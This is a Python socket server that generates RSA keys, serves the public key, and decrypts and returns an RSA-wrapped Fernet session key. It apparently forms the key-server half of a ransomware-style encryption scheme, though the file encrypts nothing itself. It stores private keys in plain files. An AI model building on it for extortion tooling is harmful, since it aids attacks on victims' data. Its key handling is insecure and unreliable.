import socket

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import os # to get system root


SERVER_IP = 'localhost'
SERVER_PORT = 5678
sysRoot = os.path.expanduser('~')
localRoot = os.path.join(sysRoot, 'Documents')


# Generates RSA Encryption + Decryption keys / Public + Private keys
public_key = None
private_key = None
private_crypter = None

def generateKeys():
        key = RSA.generate(2048)
        private_key = key.export_key()
        with open('private.pem', 'wb') as f:
            f.write(private_key)

        public_key = key.publickey().export_key()
        with open('public.pem', 'wb') as f:
            f.write(public_key)
            
        print('public_key '+ public_key.decode())
        print('\n\n')
        print('private_key '+ private_key.decode())
        print('\n\n')
            
        # Create a new file in the localRoot directory
        filename = "keyPair.key"
        filepath = os.path.join(localRoot, filename)
        with open(filepath, 'wb') as f:
            f.write(public_key)
            f.write(b'\n')  # Add a newline character to separate the keys
            f.write(private_key)
            f.write(b'\n')  # Add a newline character to separate the keys
                    
        print('in write_key : ')
        print('\n\n\n\n\n')
        private_key = RSA.import_key(private_key) # Private RSA key  RSA.import_key(open('private.pem').read())
        private_crypter = PKCS1_OAEP.new(private_key) # Private decrypter
        return public_key , private_key , private_crypter


#TODO send the dec_fernet_key back to the sever 



with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    conn,addr = s.accept()
    public_key , private_key , private_crypter = generateKeys()
    print(f'Connection accepted from :{addr}')
    with conn:
        while True:
            # Receive the message type
            message_type = conn.recv(1024)
            print('received : the encrypted_key...',)

            # try:
            #     print('received from the client: ' + message_type)
            # except UnicodeDecodeError:
            #     print('Received from the client : ' + message_type.decode())
            print(message_type)
            if message_type == b'public_key':
                # Send the public key
                print('sending  public_key: ')
                print('\n\n')
                conn.send(public_key)
                
            elif message_type == b'enc_fernet_key':
                # Receive the encrypted session key
                enc_fernet_key = conn.recv(1024)
                print('received : the encrypted_key...',)
                print('\n\n')
                print(f'encrypted_key {enc_fernet_key}')
                print('\n\n')
                # Decrypt the session key
                dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
                
                # Send the decrypted session key
                while(1==1):
                    if(dec_fernet_key != b''):
                        break
                conn.send(dec_fernet_key)
                print(f'decrypted_key {dec_fernet_key}')
                print('\n\n')
                print('sent : the decrypted_key ..')
                print('\n\n')
                
            else:
                # Invalid message type
                print('End')
                break
        
        